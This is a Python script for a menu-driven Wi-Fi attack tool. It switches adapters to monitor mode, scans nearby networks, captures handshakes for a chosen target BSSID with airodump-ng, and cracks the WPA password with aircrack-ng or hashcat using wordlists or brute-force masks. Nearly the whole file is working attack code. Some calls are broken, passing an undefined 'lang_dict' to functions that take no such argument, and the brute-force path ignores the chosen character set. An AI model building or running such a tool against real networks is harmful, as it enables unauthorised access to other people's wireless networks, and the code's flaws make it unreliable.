import subprocess
from scapy.all import *
import os
from colorama import init, Fore, Style

# Initialize colorama
init()

def show_banner():
    banner = f"""
{Fore.RED}{Style.BRIGHT}
 _    _            _     _ 
| |  | |          | |   (_)
| |__| | __ _  ___| |__  _ 
|  __  |/ _` |/ __| '_ \\| |
| |  | | (_| | (__| | | | |
|_|  |_|\\__,_|\\___|_| |_|_|
                          
{Style.RESET_ALL}
"""
    print(banner)

def enable_monitor_mode(interface):
    try:
        print(f"Enabling monitor mode on {interface}...")
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        print(f"Monitor mode enabled on {interface}.")
    except Exception as e:
        print(f"Error enabling monitor mode: {e}")

def disable_monitor_mode(interface):
    try:
        print(f"Disabling monitor mode on {interface}...")
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        print(f"Monitor mode disabled on {interface}.")
    except Exception as e:
        print(f"Error disabling monitor mode: {e}")

def list_network_adapters():
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        adapters = [line.split()[0] for line in lines if 'IEEE' in line]
        return adapters
    except Exception as e:
        print(f"Error listing network adapters: {e}")
        return []

def scan_networks(interface, show_hidden):
    enable_monitor_mode(interface)
    networks = []
    
    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode(errors='ignore')
            bssid = packet[Dot11].addr2
            if ssid == '' and show_hidden:
                ssid = '<Hidden>'
            if {'ssid': ssid, 'bssid': bssid} not in networks:
                networks.append({'ssid': ssid, 'bssid': bssid})

    print(f"Scanning for networks on {interface}...")
    sniff(iface=interface, prn=packet_handler, timeout=10)
    disable_monitor_mode(interface)

    print("Available networks:")
    for i, net in enumerate(networks):
        print(f"{i + 1}. SSID: {net['ssid']} | BSSID: {net['bssid']}")

    return networks

def capture_packets(interface, bssid):
    enable_monitor_mode(interface)
    try:
        print(f"Capturing packets on {interface} for BSSID {bssid}...")
        subprocess.run(["airodump-ng", interface, "-w", "capture", "--output-format", "cap", "--bssid", bssid], check=True)
    except Exception as e:
        print(f"Error capturing packets: {e}")
    finally:
        disable_monitor_mode(interface)

def create_wordlist():
    filename = input("Enter the filename for your wordlist: ")
    print("Enter words for the wordlist (type 'done' when finished):")
    try:
        with open(filename, 'w') as f:
            while True:
                word = input("> ")
                if word.lower() == 'done':
                    break
                f.write(word + "\n")
        print(f"Wordlist saved as {filename}")
    except Exception as e:
        print(f"Error creating wordlist: {e}")

def generate_custom_input():
    try:
        length = int(input("Enter the length of the password to crack: "))
        use_uppercase = input("Include uppercase letters? (y/n): ").lower() == 'y'
        use_lowercase = input("Include lowercase letters? (y/n): ").lower() == 'y'
        use_digits = input("Include digits? (y/n): ").lower() == 'y'
        use_special = input("Include special characters? (y/n): ").lower() == 'y'

        charset = ''
        if use_uppercase:
            charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        if use_lowercase:
            charset += 'abcdefghijklmnopqrstuvwxyz'
        if use_digits:
            charset += '0123456789'
        if use_special:
            charset += '!@#$%^&*()-_=+[]{}|;:<>,.?/~`'

        return charset, length
    except ValueError:
        print("Invalid input. Please try again.")
        return '', 0

def crack_password(cap_file, wordlist=None, use_gpu=False, custom_input=None, use_hashcat=False):
    try:
        if wordlist:
            if use_gpu:
                print(f"Cracking password using {wordlist} with Hashcat...")
                subprocess.run(["hashcat", "-m", "2500", cap_file, wordlist], check=True)
            else:
                print(f"Cracking password using {wordlist} with Aircrack-ng...")
                subprocess.run(["aircrack-ng", "-w", wordlist, cap_file], check=True)
        elif custom_input:
            charset, length = custom_input
            if not charset or not length:
                print("Invalid custom input. Please try again.")
                return

            if use_hashcat:
                hashcat_mask = '?1' * length
                hashcat_charsets = f'-1{charset}'
                print(f"Cracking password using custom input with Hashcat...")
                subprocess.run(["hashcat", "-m", "2500", hashcat_charsets, cap_file, hashcat_mask], check=True)
            else:
                print(f"Cracking password using custom input with Aircrack-ng...")
                wordlist_file = "custom_wordlist.txt"
                with open(wordlist_file, 'w') as f:
                    for i in range(10**length):
                        f.write(f"{i:0{length}}\n")
                subprocess.run(["aircrack-ng", "-w", wordlist_file, cap_file], check=True)
    except Exception as e:
        print(f"Error cracking password: {e}")

def install_tools():
    try:
        print("Installing required tools...")
        subprocess.run(["apt-get", "install", "aircrack-ng", "hashcat", "-y"], check=True)
        print("Tools installed successfully.")
    except Exception as e:
        print(f"Error installing tools: {e}")

def main():
    show_banner()
    while True:
        print("\nMenu:")
        print("1. Install Required Tools")
        print("2. List Network Adapters")
        print("3. Scan Networks")
        print("4. Capture Packets")
        print("5. Create Wordlist")
        print("6. Crack Password (CPU)")
        print("7. Crack Password (GPU with Hashcat)")
        print("8. Crack Password Without Wordlist (Custom Input with Aircrack-ng)")
        print("9. Crack Password Without Wordlist (Custom Input with Hashcat)")
        print("10. Exit")
        
        choice = input("Enter your choice: ")
        
        if choice == "1":
            install_tools()
        elif choice == "2":
            adapters = list_network_adapters()
            if adapters:
                print("Available network adapters:")
                for i, adapter in enumerate(adapters):
                    print(f"{i + 1}. {adapter}")
            else:
                print("No network adapters found.")
        elif choice == "3":
            adapters = list_network_adapters()
            if adapters:
                print("Available network adapters:")
                for i, adapter in enumerate(adapters):
                    print(f"{i + 1}. {adapter}")
                adapter_choice = int(input("Select the network adapter to use (number): ")) - 1
                interface = adapters[adapter_choice]
                show_hidden = input("Do you want to show hidden networks? (y/n): ").lower() == 'y'
                scan_networks(interface, show_hidden)
            else:
                print("No network adapters found.")
        elif choice == "4":
            adapters = list_network_adapters()
            if adapters:
                print("Available network adapters:")
                for i, adapter in enumerate(adapters):
                    print(f"{i + 1}. {adapter}")
                adapter_choice = int(input("Select the network adapter to use (number): ")) - 1
                interface = adapters[adapter_choice]
                bssid = input("Enter the BSSID of the target network: ")
                capture_packets(interface, bssid)
            else:
                print("No network adapters found.")
        elif choice == '5':
            create_wordlist(lang_dict)
        elif choice == '6':
            cap_file = input("Enter the capture file: ")
            wordlist = input("Enter wordlist file: ")
            crack_password(cap_file, wordlist=wordlist)
        elif choice == '7':
            cap_file = input("Enter the capture file: ")
            wordlist = input("Enter wordlist file: ")
            crack_password(cap_file, wordlist=wordlist, use_gpu=True)
        elif choice == '8':
            cap_file = input("Enter the capture file: ")
            custom_input = generate_custom_input(lang_dict)
            crack_password(cap_file, custom_input=custom_input)
        elif choice == '9':
            cap_file = input("Enter the capture file: ")
            custom_input = generate_custom_input(lang_dict)
            crack_password(cap_file, custom_input=custom_input, use_hashcat=True)

        elif choice == "10":
            print("Exiting...")
            break

if __name__ == "__main__":
    main()
